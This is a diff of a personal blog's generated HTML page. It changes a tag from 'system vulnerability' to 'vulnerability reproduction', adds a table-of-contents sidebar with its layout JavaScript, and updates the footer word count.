-                        <span class="chip bg-color">系统漏洞</span>
+                    <a href="/tags/漏洞复现/" target="_blank">
+                        <span class="chip bg-color">漏洞复现</span>
                     </a>
                     
                 </div>
@@ -797,6 +950,99 @@
     });
 </script>
 
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="fa fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fa fa-list"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            // headingsOffset: -205,
+            headingSelector: 'h1, h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h1, h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).slideUp(500);
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).slideDown(500);
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
     
 
 </main>
@@ -808,7 +1054,7 @@
             🚀 2019 朋与厌. All Rights Reserved.
             
             &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-            <span class="white-color">11.5k</span>
+            <span class="white-color">9k</span>
             
 
             <br>
